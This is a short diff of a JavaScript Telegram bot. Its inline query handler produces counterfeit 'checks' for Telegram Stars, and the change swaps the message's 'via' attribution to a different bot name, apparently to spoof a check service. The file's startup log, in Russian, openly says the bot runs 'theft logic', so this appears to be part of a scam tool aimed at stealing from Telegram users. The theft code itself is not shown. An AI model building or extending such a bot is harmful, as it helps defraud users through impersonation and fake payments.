@@ -132,7 +132,7 @@ bot.on('inline_query', (query) => {
             title: `Создать чек на ${amount} звезд`,
             description: `Количество активаций: 1`,
             input_message_content: {
-                message_text: `via @EasyChecs_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд    ${new Date().toLocaleTimeString().slice(0,5)}`,
+                message_text: `via @@MyStarBank_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд    ${new Date().toLocaleTimeString().slice(0,5)}`,
                 parse_mode: 'HTML'
             },
             reply_markup: {
@@ -280,4 +280,5 @@ bot.setMyCommands([
 ]);
 
 console.log('Бот запущен с inline подсказками и логикой кражи');
+
 
